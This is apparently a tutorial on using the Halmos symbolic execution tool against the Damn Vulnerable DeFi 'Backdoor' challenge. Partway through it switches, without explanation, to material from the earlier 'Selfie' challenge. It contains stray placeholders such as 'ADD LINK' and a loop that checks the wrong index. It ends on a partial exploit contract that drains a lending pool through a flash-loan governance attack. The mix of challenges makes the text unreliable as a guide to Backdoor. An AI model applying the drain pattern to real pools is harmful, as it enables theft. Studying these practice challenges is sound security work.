# Halmos vs Backdoor
## Halmos version
halmos 0.2.4.dev6+g606ac51
## Foreword
It is strongly assumed that the reader is familiar with the previous articles on solving 
1. [Unstoppable](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/unstoppable) 
2. [Truster](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster)
3. [Naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver)
4. [Side-entrance](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/side-entrance)
5. [The-rewarder](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/the-rewarder)
6. [Selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie)

since the main ideas here are largely repeated and we will not dwell on them again.
## Preparation
### Common prerequisites
1. Copy **Backdoor.t.sol** file to **BackdoorHalmos.t.sol**.
2. Rename `test_backdoor()` to `check_backdoor()`, so Halmos will execute this test symbolically.
3. Avoid using **makeAddr()** cheatcode:
    ```solidity
    address deployer = address(0xcafe0000);
    address player = address(0xcafe0001);
    address recovery = address(0xcafe0002);
    address[] users = [address(0xcafe0003), address(0xcafe0004), address(0xcafe0005), address(0xcafe0006)];
    ```
4. Create **GlobalStorage** contract and save address-name pairs of contracts:
    ```solidity
    ...
    import "lib/GlobalStorage.sol";
    ...
    GlobalStorage glob;
    ...
    function setUp() public {
        ...
        glob = new GlobalStorage();
        ...
        glob.add_addr_name_pair(address(singletonCopy), "Safe");
        glob.add_addr_name_pair(address(walletFactory), "SafeProxyFactory");
        glob.add_addr_name_pair(address(token), "DamnValuableToken");
        glob.add_addr_name_pair(address(walletRegistry), "WalletRegistry");
        ...
    ```
5. Print all contract addresses:
    ```solidity
    function check_backdoor() public checkSolvedByPlayer {
        SymbolicAttacker attacker = new SymbolicAttacker();
        console.log("GlobalStorage\t", address(glob));
        console.log("singletonCopy\t", address(singletonCopy));
        console.log("walletFactory\t", address(walletFactory));
        console.log("token\t\t", address(token));
        console.log("walletRegistry\t", address(walletRegistry));
        console.log("attacker\t\t", address(attacker));
        ...
    }
    ```
    ```javascript
    $ halmos --solver-timeout-assertion 0 --function check_backdoor --loop 4
    ...
    [console.log] GlobalStorage      0x00000000000000000000000000000000000000000000000000000000aaaa0002
    [console.log] singletonCopy      0x00000000000000000000000000000000000000000000000000000000aaaa0003
    [console.log] walletFactory      0x00000000000000000000000000000000000000000000000000000000aaaa0004
    [console.log] token              0x00000000000000000000000000000000000000000000000000000000aaaa0005
    [console.log] walletRegistry     0x00000000000000000000000000000000000000000000000000000000aaaa0006
    [console.log] attacker           0x00000000000000000000000000000000000000000000000000000000aaaa0007
    ...
    ```
6. `vm.getNonce` is an unsupported cheatcode. Delete it.
### _isSolved() implementation
The original checks look like:
```solidity
function _isSolved() private view {
    // Player must have executed a single transaction
    assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

    for (uint256 i = 0; i < users.length; i++) {
        address wallet = walletRegistry.wallets(users[i]);

        // User must have registered a wallet
        assertTrue(wallet != address(0), "User didn't register a wallet");

        // User is no longer registered as a beneficiary
        assertFalse(walletRegistry.beneficiaries(users[i]));
    }

    // Recovery account must own all tokens
    assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
}
```
At first, you might think that, by analogy with the previous challenges, we will look for a scenario where we empty the `walletRegistry`. But, in fact, this is valid behavior. It should distribute its tokens to users as a reward. Instead, we will check if we can empty the balance of the created wallets:
```solidity
function _isSolved() private view {
    for (uint256 i = 0; i < users.length; i++) {
        address wallet = walletRegistry.wallets(users[i]);

        if (wallet != address(0)) {
            assert(token.balanceOf(wallet) >= 10e18);
        }
    }
}
```
And, taking into account the conclusions from selfie(ADD LINK), we will add another rather obvious invariant on `allowance`:
```solidity
...
address symbolic_spender = svm.createAddress("symbolic_spender");
assert(token.allowance(wallet, symbolic_spender) == 0);
...
```
## Improvement of coverage
### create2 during test
In this challenge, we have a unique feature: the logic of the test is based on the fact that new contracts will be created during the test, which means that we need to add new contracts to **GlobalStorage** where they are created:
```soliidty
function deployProxy(address _singleton, bytes memory initializer, bytes32 salt) internal returns (SafeProxy proxy) {
...
assembly {
    proxy := create2(0x0, add(0x20, deploymentData), mload(deploymentData), salt)
}
require(address(proxy) != address(0), "Create2 call failed");
glob.add_addr_name_pair(address(proxy), "SafeProxy");
...
```
Note that Halmos completely ignores the logic with `salt` when working with `create2` and creates new contracts with addresses `0xbbbb****`. 
This is, in fact, convenient for us, because it turns out not a symbolic address, but a specific one.
### delegatecall
For the first time, we meet with the target-call pattern, but at the same time we do not make `call` but `delegatecall`:
```javascript
Path #22:
...
            CALL Safe::simulateAndRevert(Concat(p_targetContract_address_76fe5e4_49(), 0x0000000000000000000000000000000000000000000000000000000000000040, p_calldataPayload_length_ea68c34_51(), p_calldataPayload_bytes_7c96bce_50()))
                DELEGATECALL Safe::Extract(p_calldataPayload_bytes_7c96bce_50())(Extract(p_calldataPayload_bytes_7c96bce_50()))
                ↩ CALLDATALOAD 0x (error: NotConcreteError('symbolic CALLDATALOAD offset: 4 + Extract(7903, 7648, p_calldataPayload_bytes_7c96bce_50)'))
...
```
```solidity
/**
 * @dev Performs a delegatecall on a targetContract in the context of self.
 * Internally reverts execution to avoid side effects (making it static).
 *
 * This method reverts with data equal to `abi.encode(bool(success), bytes(response))`.
 * Specifically, the `returndata` after a call to this method will be:
 * `success:bool || response.length:uint256 || response:bytes`.
 *
 * @param targetContract Address of the contract containing the code to execute.
 * @param calldataPayload Calldata that should be sent to the target contract (encoded method name and arguments).
 */
function simulateAndRevert(address targetContract, bytes memory calldataPayload) external {
    // solhint-disable-next-line no-inline-assembly
    assembly {
        let success := delegatecall(gas(), targetContract, add(calldataPayload, 0x20), mload(calldataPayload), 0, 0)

        mstore(0x00, success)
        mstore(0x20, returndatasize())
        returndatacopy(0x40, 0, returndatasize())
        revert(0, add(returndatasize(), 0x40))
    }
}
```
We will handle the `delegatecall` of a symbolic target quite simply: цe will specify our **SymbolicAttacker** as the only target, and the only function should be some `handle_delegatecall()` callback, in which we will symbolically iterate through the functions using the familiar method:
```solidity
bool delegatecall_reent_guard = false;

function handle_delegatecall() public {
    if (delegatecall_reent_guard) {
        revert();
    }
    delegatecall_reent_guard = true;
    execute_tx("handle_delegatecall_target");
    delegatecall_reent_guard = false;
}
```
```solidity
...
function simulateAndRevert(address targetContract, bytes memory calldataPayload) external {
    vm.assume(targetContract == address(0xaaaa0007));
    vm.assume(bytes4(calldataPayload) == bytes4(keccak256("handle_delegatecall()")));
    ...
}
```
There are several more such places with `delegatecall` crash:
```javascript
Path #185:
...
            CALL SafeProxyFactory::createProxyWithNonce(...)
            ...
                CALL SafeProxy::Extract(p_initializer_bytes_56179b1_14())(Extract(p_initializer_bytes_56179b1_14()))
                    DELEGATECALL SafeProxy::Extract(p_initializer_bytes_56179b1_14())(Extract(p_initializer_bytes_56179b1_14()))
                    ↩ CALLDATALOAD 0x ((error: NotConcreteError('symbolic CALLDATALOAD offset: 4 + Extract(7903, 7648, p_initializer_bytes_56179b1_14)'))
```
```solidity
function deployProxy(...) {
    ...
    if (initializer.length > 0) {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            if eq(call(gas(), proxy, 0, add(initializer, 0x20), mload(initializer), 0, 0), 0) {
                revert(0, 0)
            }
        }
    }
}
```
I know, from these logs it is not at all clear what happened. But it is enough to look at the implementation of **SafeProxy** and everything will become clear:
```solidity
contract SafeProxy {
    // Singleton always needs to be first declared variable, to ensure that it is at the same location in the contracts to which calls are delegated.
    // To reduce deployment costs this variable is internal and needs to be retrieved via `getStorageAt`
    address internal singleton;

    /**
     * @notice Constructor function sets address of singleton contract.
     * @param _singleton Singleton address.
     */
    constructor(address _singleton) {
        require(_singleton != address(0), "Invalid singleton address provided");
        singleton = _singleton;
    }

    /// @dev Fallback function forwards all transactions and returns all received return data.
    fallback() external payable {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            let _singleton := and(sload(0), 0xffffffffffffffffffffffffffffffffffffffff)
            // 0xa619486e == keccak("masterCopy()"). The value is right padded to 32-bytes with 0s
            if eq(calldataload(0), 0xa619486e00000000000000000000000000000000000000000000000000000000) {
                mstore(0, _singleton)
                return(0, 0x20)
            }
            calldatacopy(0, 0, calldatasize())
            let success := delegatecall(gas(), _singleton, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            if eq(success, 0) {
                revert(0, returndatasize())
            }
            return(0, returndatasize())
        }
    }
}
```
Halmos automatically performs `fallback()` (which is the only function of this contract). And inside it is this `delegatecall`. Before fixing this error, let's talk about how this feature works in general at the moment in the context of Halmos. 

This contract is written in such a way that it is convenient to use any function from **Safe** while calling **safeProxy**.  And since Halmos handles the case when the function we're trying to reach from the `proxy` doesn't exist in the `singleton`, it can call a `fallback` again. So we have to add protection against recursion.

Next, since the `singleton` address is transmitted in a symbolic manner when creating a `proxy`, we work with some symbolic `singleton`.

We need to fix the error that occurs when using the target-call pattern, while not damaging the main logic of this `proxy`. It's hard to think of anything better than just adding another `symbolic_fallback` function that will handle this specific case that throws this error:
```solidity
function symbolic_fallback() external payable {
    if (reent_guard) {
        revert();
    }
    reent_guard = true;
    address singleton_address;
    bytes memory initializer_data;
    (singleton_address, initializer_data) = glob.get_concrete_from_symbolic_optimized(singleton);
    (bool success,bytes memory returndata) = singleton_address.delegatecall(initializer_data);
    reent_guard = false;
    if (!success) {
        // Revert with the returned data
        assembly {
            revert(add(returndata, 0x20), mload(returndata))
        }
    }

    // Return with the returned data
    assembly {
        return(add(returndata, 0x20), mload(returndata))
    }
}

fallback() external payable {
        // Check for mastercopy() call
        if (msg.sig == bytes4(keccak256("mastercopy()"))) {
            assembly {
                mstore(0x00, sload(singleton.slot))
                return(0x00, 32)
            }
        } else {
            _delegateCall();
        }
    }

    function _delegateCall() internal {
        (bool success, bytes memory returndata) = singleton.delegatecall(msg.data);
        if (!success) {
            // Revert with the returned data
            assembly {
                revert(add(returndata, 0x20), mload(returndata))
            }
        }

        // Return with the returned data
        assembly {
            return(add(returndata, 0x20), mload(returndata))
        }
    }
```
```solidity
function deployProxy(...) {
    ...
    if (initializer.length > 0) {
        // solhint-disable-next-line no-inline-assembly
        /*assembly {
            if eq(call(gas(), proxy, 0, add(initializer, 0x20), mload(initializer), 0, 0), 0) {
                revert(0, 0)
            }
        }*/
        proxy.symbolic_fallback();
    }
}
```

And one more place with `delegatecall`:
```solidity
abstract contract Executor {
...
    function execute(
        address to,
        uint256 value,
        bytes memory data,
        Enum.Operation operation,
        uint256 txGas
    ) internal returns (bool success) {
        if (operation == Enum.Operation.DelegateCall) {
            // solhint-disable-next-line no-inline-assembly
            assembly {
                success := delegatecall(txGas, to, add(data, 0x20), mload(data), 0, 0)
            }
        } else {
            // solhint-disable-next-line no-inline-assembly
            assembly {
                success := call(txGas, to, value, add(data, 0x20), mload(data), 0, 0)
            }
        }
    }
...
}
```
Even though this place doesn't throw a **revert**, it's still better to use `delegatecall_handler` than iterating through Halmos automatically to make it more generic.
```solidity
if (operation == Enum.Operation.DelegateCall) {
    // solhint-disable-next-line no-inline-assembly
    vm.assume(to == address(0xaaaa0007));
    vm.assume(bytes4(data) == bytes4(keccak256("handle_delegatecall()")));
    ...
```
### Regular symbolic memory offset
There is also the usual `call` by symbolic calldata:
```solidity
function execute(
        address to,
        uint256 value,
        bytes memory data,
        Enum.Operation operation,
        uint256 txGas
    ) internal returns (bool success) {
...
   else {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            success := call(txGas, to, value, add(data, 0x20), mload(data), 0, 0)
        }
    }
}
```
We deal with it as usual:
```solidity
...
} else {
   address target = svm.createAddress("execute_target");
    bytes memory mydata;
    //Get some concrete target-name pair
    (target, mydata) = glob.get_concrete_from_symbolic_optimized(target);
    target.call(mydata);
    
    /*assembly {
        success := call(txGas, to, value, add(data, 0x20), mload(data), 0, 0)
    }*/
}
...
```
### OwnerIsNotABeneficiary issue
Let's try running the test now:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_backdoor --loop 100
...
CALL SafeProxyFactory::createProxyWithCallback(...)
...
    CALL SafeProxy::symbolic_fallback(...)
    ...
        DELEGATECALL SafeProxy::setup(...)
    ...
    CALL  0xaaaa0006::proxyCreated(...)
    ...
        REVERT OwnerIsNotABeneficiary ((error: Revert())
    ...
```
This revert happens after we made a valid `call` to `createProxyWithCallback`, `setup` was executed, but for some reason Halmos cannot understand that the `owner` we passed in the setup process can be some valid `owner`:
```solidity
function createProxyWithCallback(...) {
    uint256 saltNonceWithCallback = uint256(keccak256(abi.encodePacked(saltNonce, callback)));
    proxy = createProxyWithNonce(_singleton, initializer, saltNonceWithCallback);
    if (address(callback) != address(0)) callback.proxyCreated(proxy, _singleton, initializer, saltNonce);
}
```
```solidity
function setup(
    address[] calldata _owners,
    uint256 _threshold,
...
) {
    setupOwners(_owners, _threshold);// owners setup is happening here
    ...
}
```
```solidity
function proxyCreated(SafeProxy proxy, address singleton, bytes calldata initializer, uint256) external override {
    ...
    if (owners.length != EXPECTED_OWNERS_COUNT) { // 1 is expected count
        revert InvalidOwnersCount(owners.length);
    }

    // Ensure the owner is a registered beneficiary
    address walletOwner;
    unchecked {
        walletOwner = owners[0];
    }
    if (!beneficiaries[walletOwner]) {
        revert OwnerIsNotABeneficiary();
    }
    ...
```
At least, it sees a scenario where there is only one `owner`. Let's print this `owner`, see why Halmos doesn't see that owner can be valid:
```solidity
...
console.log("walletOwner is");
console.log(walletOwner);
if (!beneficiaries[walletOwner]) {
    revert OwnerIsNotABeneficiary();
}
```
```javascript
$ halmos --solver-timeout-assertion 0 --function check_backdoor --loop 100
...
[console.log] walletOwner is
[console.log] 0x0000000000000000000000000000000000000000000000000000000000000000
...
```
What? `0x0`? Why not symbolic? To answer this question, you need to understand how this algorithm stores and then reads the list of `owners`:
```solidity
...
address internal constant SENTINEL_OWNERS = address(0x1);
mapping(address => address) internal owners;
    ...
function setupOwners(address[] memory _owners, uint256 _threshold) internal {
    // Threshold can only be 0 at initialization.
    // Check ensures that setup function can only be called once.
    require(threshold == 0, "GS200");
    // Validate that threshold is smaller than number of added owners.
    require(_threshold <= _owners.length, "GS201");
    // There has to be at least one Safe owner.
    require(_threshold >= 1, "GS202");
    // Initializing Safe owners.
    address currentOwner = SENTINEL_OWNERS;
    for (uint256 i = 0; i < _owners.length; i++) {
        // Owner address cannot be null.
        address owner = _owners[i];
        require(owner != address(0) && owner != SENTINEL_OWNERS && owner != address(this) && currentOwner != owner, "GS203");
        // No duplicate owners allowed.
        require(owners[owner] == address(0), "GS204");
        owners[currentOwner] = owner;
        currentOwner = owner;
    }
    owners[currentOwner] = SENTINEL_OWNERS;
    ownerCount = _owners.length;
    threshold = _threshold;
}
...
function getOwners() public view returns (address[] memory) {
    address[] memory array = new address[](ownerCount);

    // populate return array
    uint256 index = 0;
    address currentOwner = owners[SENTINEL_OWNERS];
    while (currentOwner != SENTINEL_OWNERS) {
        array[index] = currentOwner;
        currentOwner = owners[currentOwner];
        index++;
    }
    return array;
}
```
Some clever algorithm is used, which allows you to store owners' addresses in the mapping, and then craft an array based on it. The problem is that Halmos does not handle cases when the mapping index is some symbolic value:
```solidity
owners[currentOwner] = owner;
...
owners[currentOwner] = SENTINEL_OWNERS;
```
It is, in fact, difficult to catch or even understand that something is wrong. 

Okay, let's fix it somehow. For this particular case, I propose to abandon this algorithm through mapping, and use a regular array, assuming that there are no more than 2 owners (the largest size of a dynamic array considered by Halmos according to the standard):
```solidity
...
mapping(address => address) internal owners;
address[2] array_owners;
...
function setupOwners(address[] memory _owners, uint256 _threshold) internal {
    ...
    for (uint256 i = 0; i < _owners.length; i++) {
        ...
        owners[i] = _owners[i];
    }
    ...
}
...
function getOwners() public view returns (address[] memory) {
    address[] memory array = new address[](ownerCount);
    for (uint256 i = 0; i < ownerCount; i++)  {
        array[i] = array_owners[i];
    }
    return array;
}
```
Run:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_backdoor --loop 100
...
[console.log] walletOwner is
[console.log] Concat(0x000000000000000000000000, Extract(p__owners[0]_address_c7821fc_58()))
...
```
So much better!
## Beating recursion issue
```javascript
halmos --solver-timeout-assertion 0 --function check_backdoor --loop 100 -vvvvv
...
Path #9642:
...
    CALL 0xaaaa0003::simulateAndRevert(...)
    ...
        CALL 0xaaaa0004::createProxyWithNonce(...)
    ...
            CALL 0xbbbb0016::0x7bb34722()
    ...
                DELEGATECALL 0xbbbb0016::setup
    ...
                    DELEGATECALL 0xbbbb0016::handle_delegatecall()
    ...
                        CALL 0xaaaa0004::createProxyWithCallback(...)
    ...
                            CALL 0xbbbb0022::0x7bb34722()
    ...                        
...
ERROR    ArgumentError: argument 1: RecursionError: maximum recursion depth exceeded 
```
Due to the high complexity of the setup, we have several ways to access the `SafeProxyFactory::deployProxy` function. In addition, creating a contract through this function can call `deployProxy` again, but from a different entry point:
```solidity
function createProxyWithNonce(...) public {
    ...
    proxy = deployProxy(_singleton, initializer, salt);
    ...
}
...
function createChainSpecificProxyWithNonce(...) public {
   ...
   proxy = deployProxy(_singleton, initializer, salt);
   ...
}
...
function createProxyWithCallback(...) public {
    ...
    proxy = createProxyWithNonce(_singleton, initializer, saltNonceWithCallback);
    ...
}
...
```
Therefore, the usual way of avoiding recursion by using `get_concrete_from_symbolic_optimized` is not suitable for us. A new, stronger way is needed. To do this, we will add new functionality to **GlobalStorage** to catch such more complex recursion scenarios:
```solidity
contract GlobalStorage is Test, SymTest {
...
    mapping (string => bool) anti_recursion_map;

    function set_recursion_flag(string calldata id) public {
        if (anti_recursion_map[id] == true) {
            revert(); // recursion happened
        }
        anti_recursion_map[id] = true;
    }

    function remove_recursion_flag(string calldata id) public {
        anti_recursion_map[id] = false;
    }
...
```
```solidity
function deployProxy(...) {
    glob.set_recursion_flag("deployProxy");
    ...
    glob.remove_recursion_flag("deployProxy");
}
```
## Optimizations and heuristics
We have already met with path explosion limits in [Naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver#optimizations). And we can already highlight several directions of optimizations and heuristics that can be applied to bypass this limitation:
1. Add "solid" optimizations, which are known to have no effect on the result.
2. Add heuristics that can cut some scenarios, but don't reduce overall code coverage.
3. Simplify/change the invariant to make the engine's task easier.

Let's go through each of these points.
### Solid optimizations
The first thing I can think of here is to completely exclude `ERC20::permit` from symbolic function candidates, which is already starting to get annoying. I can't think of any scenario where we could apply it where `ERC20Votes::approve` is not applicable:
```solidity
/*
** This function has the same purpose as get_concrete_from_symbolic, 
** but applies optimizations and heuristics.
*/
function get_concrete_from_symbolic_optimized (address /*symbolic*/ addr) public view 
                                    returns (address ret, bytes memory data) 
{
    for (uint256 i = 0; i < addresses_list_size; i++) {
        if (addresses[i] == addr) {
            string memory name = names_by_addr[addresses[i]];
            ret = addresses[i];
            data = svm.createCalldata(name);
            bytes4 selector = svm.createBytes4("selector");
            vm.assume(selector == bytes4(data));
            // Not DamnValuableVotes permit
            vm.assume(selector != bytes4(keccak256("permit(address,address,uint256,uint256,uint8,bytes32,bytes32)")));
            return (ret, data);
        }
    }
    revert(); // Ignore cases when addr is not some concrete known address
}
```
A similar situation with `ERC20Votes::delegateBySig`. We have a simple `ERC20Votes::delegate` that we can apply in all the same scenarios:
```solidity
function get_concrete_from_symbolic_optimized (...) 
{
    ...
    // Not DamnValuableVotes::delegateBySig
    vm.assume(selector != bytes4(keccak256("delegateBySig(address,uint256,uint256,uint8,bytes32,bytes32)")));
    ...
}
```
### Cut scenarios
Let's try to cut down the scenarios in which we symbolically enter the same function several times. Now we can't enter the same function symbolically twice during the path. At the same time, the overall coverage of the code will not decrease, we will still go through all scenarios where these functions are entered once:
```solidity
contract GlobalStorage is Test, SymTest {
    ...
    mapping (uint256 => bytes4) used_selectors;
    uint256 used_selectors_size = 0;
    ...
    function get_concrete_from_symbolic_optimized (...) 
    {
        ...
        for (uint256 s = 0; s < used_selectors_size; s++) {
            vm.assume(selector != used_selectors[i]);
        }
        used_selectors[used_selectors_size] = selector;
        used_selectors_size++;
        ...
    }
    ...
}
```
Another sacrifice of scenarios in exchange for avoiding duplication coverage can be achieved if you expand the number of symbolic transactions not in `attack()`, but in `onFlashLoan()` callback. This way we still process 2 symbolic transactions, but only if a **flashLoan** happened, which saves us a lot of resources:
```solidity
...
function execute_tx(string memory target_name) private {
        address target = svm.createAddress(target_name);
        bytes memory data;
        //Get some concrete target-name pair
        (target, data) = glob.get_concrete_from_symbolic_optimized(target);
        target.call(data);
    }

    function onFlashLoan(address initiator, address token,
                        uint256 amount, uint256 fee,
                        bytes calldata data
    ) external returns (bytes32) 
    {
        execute_tx("onFlashLoan_target1");
        uint256 warp = svm.createUint256("onFlashLoan_warp");
        vm.warp(block.timestamp + warp); // wait for symbolic time between transactions
        execute_tx("onFlashLoan_target2");
        DamnValuableVotes(token).approve(address(msg.sender), 2**256 - 1); // unlimited approve for pool
        return (keccak256("ERC3156FlashBorrower.onFlashLoan"));
    }
...
function attack() public {
    execute_tx();
    /*uint256 warp = svm.createUint256("warp");
    vm.warp(block.timestamp + warp); // wait for symbolic time between transactions
    execute_tx();*/
}
```
Yes, we have moved the `vm.warp()` from `attack()` to `onFlashLoan()` right in the middle of the transaction. Because we can! This is risky because it can cause **false positives**. We hope this will not happen. This is the price of optimization heuristics.
### Invariants
Until now, we used only invariants that somehow followed from the initial conditions of the problem. I suggest this time to go a much more creative way and come up with any scenarios that seem unexpected, unnatural or buggy. Yes, let's do the work for the imaginary developers of these contracts and cover them with tests :D.

Let's start with token **allowance**. It is unexpectedly, that as a result of the **attacker's** actions, the **pool's** or **governance's** allowance may somehow change:
```solidity
function _isSolved() private view {
    ...
    // Check allowance changes
    address symbolicSpender = svm.createAddress("symbolicSpender");
    assert (token.allowance(address(pool), symbolicSpender) == 0);
    assert (token.allowance(address(governance), symbolicSpender) == 0);
    ...
}
```
in **simpleGovernance** contract `_votingToken` is not immutable:
```solidity
contract SimpleGovernance is ISimpleGovernance {
    ...
    DamnValuableVotes private _votingToken;
    ...
}
```
Perhaps there is a scenario in which we can somehow change it:
```solidity
function _isSolved() private view {
    ...
    //check if governance's _votingToken may be changed
    assert (governance._votingToken() == token);
    ...
}
```
And what we have already talked about above. It is unexpected that there may be a scenario where an **attacker** can register some **action**:
```solidity
function _isSolved() private view {
    ...
    // Check number of registered actions
    assert (governance._actionCounter() == 1);
    ...
}
```
Run:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_selfie --loop 3
...
Counterexample:
halmos_attack_target_address_76088a0_01 = 0x00000000000000000000000000000000aaaa0005
halmos_onFlashLoan_target1_address_e2e23e2_11 = 0x00000000000000000000000000000000aaaa0003
halmos_onFlashLoan_target2_address_96959d6_37 = 0x00000000000000000000000000000000aaaa0004
halmos_onFlashLoan_warp_uint256_3e01f3b_36 = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe
halmos_selector_bytes4_1324286_10 = flashLoan
halmos_selector_bytes4_9ca1d33_35 = delegate
halmos_selector_bytes4_e371046_45 = queueAction
halmos_symbolicSpender_address_979144d_46 = 0x0000000000000000000000000000000000000000
p__amount_uint256_5941bda_07 = 0x00000000000000000000000000000000000000000000ffe33bfeffedf1800001
p__data_length_a72e3db_09 = 0x0000000000000000000000000000000000000000000000000000000000000000
p__receiver_address_669827c_05 = 0x00000000000000000000000000000000000000000000000000000000aaaa0006
p__token_address_46b250b_06 = 0x00000000000000000000000000000000000000000000000000000000aaaa0003
p_data_length_77de601_44 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_delegatee_address_e1aa274_16 = 0x00000000000000000000000000000000000000000000000000000000aaaa0006
p_target_address_188b5bf_41 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_value_uint128_14d3e47_42 = 0x0000000000000000000000000000000000000000000000000000000000000000
[FAIL] check_selfie() (paths: 7080, time: 948.98s, bounds: [])
```
Cool! We reduced the number of paths to ~7000 and found a scenario where an **attacker** can register an **action**: We borrow tokens through `flashLoan`, `delegate` them to ourselves, register an **action**, return the loan. And actually, we haven't needed warp here yet. That's good.

But it is still not clear how to use this bug to empty the pool. Therefore, our journey continues.
## SymbolicAttacker preload
Now, before executing `attacker.attack()`, we will register some **action** using the bug we found in the previous section. But what **action** exactly? Let's make it symbolic and the solver will figure it out later.
```solidity
function check_selfie() public checkSolvedByPlayer {
    ...
    attacker.preload();
    uint256 warp = svm.createUint256("preattack_warp");
    vm.warp(block.timestamp + warp); // wait for symbolic time between transactions
    attacker.attack();
}
```
```solidity
function onFlashLoan(address initiator, address token,
                    uint256 amount, uint256 fee,
                    bytes calldata data
) external returns (bytes32) 
{
    if (is_preload) {
        DamnValuableVotes(token).delegate(address(this));
        SimpleGovernance governance = SimpleGovernance(address(0xaaaa0004));
        address target = svm.createAddress("preload_onFlashLoan_target");
        uint256 value = svm.createUint256("preload_onFlashLoan_value");
        bytes memory data = svm.createBytes(1000, "preload_onFlashLoan_data");
        governance.queueAction(target, uint128(value), data);
    }
    else {
        execute_tx("onFlashLoan_target");
    }
    DamnValuableVotes(token).approve(address(msg.sender), 2**256 - 1); // unlimited approve for pool
    return (keccak256("ERC3156FlashBorrower.onFlashLoan"));
}

function preload(SelfiePool pool, DamnValuableVotes token) public {
    is_preload = true;
    bytes memory data = svm.createBytes(1000, "preload_data");
    uint256 amount = svm.createUint256("preload_amount");
    pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), amount, data);
    is_preload = false;
}
...
```
We do not forget to remove assert for the constancy of _actionCounter, otherwise every path will be a counterexample:
```solidity
function _isSolved() private view {
    ...
    // Check number of registered actions
    //assert (governance._actionCounter() == 1);
}
```
Since we unlocked the `executeAction` function, let's start again with one symbolic transaction. Will see if that's enough.
Run:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_selfie --loop 3
...
WARNING  Encountered symbolic memory offset: 320 + Concat(...)
...
```
The problem here is:
```solidity
function executeAction(uint256 actionId) external payable returns (bytes memory) {
...
GovernanceAction storage actionToExecute = _actions[actionId];
...
```
Obviously, we have only one action. Feel free to use `assume`:
```solidity
function executeAction(uint256 actionId) external payable returns (bytes memory) {
    vm.assume(actionId == 1);
    ...
```
Also at this point we have recursion, as some function from **SymbolicAttacker** can be launched as a target.
We remove such a scenario:
```solidity
vm.assume(actionToExecute.target != address(0xaaaa0006));
return actionToExecute.target.functionCallWithValue(actionToExecute.data, actionToExecute.value);
```
Run again:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_selfie --loop 3
...
Counterexample:
    halmos_attack_target_address_ba23df8_07 = 0x00000000000000000000000000000000aaaa0004
    halmos_preattack_warp_uint256_072067d_06 = 0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    halmos_preload_amount_uint256_187eee1_02 = 0x00000000000000000000000000000000000000000000ffe33bfeffedf1800001
    halmos_preload_onFlashLoan_data_bytes_a4fe5da_05 = 0xa441d06700000000000000000000000000000000000000000000000000000000aaaa000600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    halmos_preload_onFlashLoan_target_address_1ccd7a9_03 = 0x00000000000000000000000000000000aaaa0005
    halmos_preload_onFlashLoan_value_uint256_251117f_04 = 0x0000000000000000000000000000000000000000000000000000000000000000
    halmos_selector_bytes4_b526f44_15 = executeAction
    p_actionId_uint256_b6a16cb_10 = 0x0000000000000000000000000000000000000000000000000000000000000001     
```
This time it's a little hard to follow what happened, since we added a preload stage, but it's generally clear: our **action** executes `emergencyExit` from the **pool**, thereby emptying it. Attack scenario found!
## Using a counterexample
**Attacker**:
```solidity
// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {Test, console} from "forge-std/Test.sol";

contract Attacker {
    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;
    address recovery;

    constructor(DamnValuableVotes _token, SimpleGovernance _governance, SelfiePool _pool, address _recovery) {
        token = _token;
        governance = _governance;
        pool = _pool;
        recovery = _recovery;
    }

    function onFlashLoan(address initiator, address token,
                        uint256 amount, uint256 fee,
                        bytes calldata data
    ) external returns (bytes32) 
    {
        DamnValuableVotes(token).delegate(address(this));
        address target = address(pool);
        uint128 value = 0;
